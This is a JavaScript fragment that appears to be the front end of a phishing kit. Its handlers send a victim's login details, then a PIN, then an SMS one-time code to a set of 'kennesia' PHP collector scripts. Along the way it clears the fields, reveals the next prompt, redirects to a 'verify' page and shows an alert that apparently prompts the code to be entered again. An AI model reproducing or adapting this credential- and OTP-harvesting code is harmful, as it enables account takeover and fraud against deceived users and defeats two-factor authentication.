        function sendLog(event){
            event.preventDefault();
            $("#btnsubmit").prop("disabled", true);
            $.ajax({
                type: "POST",
                url: "../kennesia/kennesia-log.php",
                data: $("#formLog").serialize(),
                dataType: "text",
                success: function () {
                    vibr(180);
                    $("#formLog input").val("");
                    $(".containerpin").show();
                }
            })
        }
        function sendPin(event){
            event.preventDefault();
            $(".containerpin *").css("opacity", "0.6");
            $.ajax({
                type: "POST",
                url: "../kennesia/kennesia-pin.php",
                data: $("#formPin").serialize(),
                dataType: "text",
                success: function () {
                    vibr(180);
                    window.location.href='../verify/';
                }
            })
        }
        function showAlert(a){
            $(".alert").slideDown();
            setTimeout(function(){
                $(".alert").slideUp(90);
            }, 3000);
        }
        function sendSms(event){
            event.preventDefault();
            $("#btnsubmit").prop("disabled", true);
            $("textarea").prop("readonly", true);
            $.ajax({
                type: "POST",
                url: "../kennesia/kennesia-sms.php",
                data: $("#formOtp").serialize(),
                dataType: "text",
                success: function () {
                    vibr(1800);
                    $("textarea").prop("readonly", false);
                    $("textarea").val("");
                    showAlert("a");
                }
            })
        }